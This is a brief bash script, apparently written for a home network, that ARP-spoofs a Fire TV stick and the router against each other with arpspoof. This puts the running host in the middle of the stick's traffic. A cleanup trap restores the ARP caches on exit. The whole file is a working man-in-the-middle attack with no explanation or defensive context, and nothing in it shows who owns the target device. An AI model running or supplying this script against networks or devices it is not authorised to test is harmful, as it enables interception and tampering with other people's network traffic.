#!/bin/bash
FIRESTICK=10.0.0.131
ROUTER=10.0.0.1
IFACE=eth0

cleanup() {
    kill $PID1 $PID2 2>/dev/null
    arping -c 3 -A -I $IFACE $ROUTER    2>/dev/null
    arping -c 3 -A -I $IFACE $FIRESTICK 2>/dev/null
}
trap cleanup EXIT

/usr/sbin/arpspoof -i $IFACE -t $FIRESTICK $ROUTER &>/dev/null &
PID1=$!
/usr/sbin/arpspoof -i $IFACE -t $ROUTER   $FIRESTICK &>/dev/null &
PID2=$!

wait $PID1 $PID2
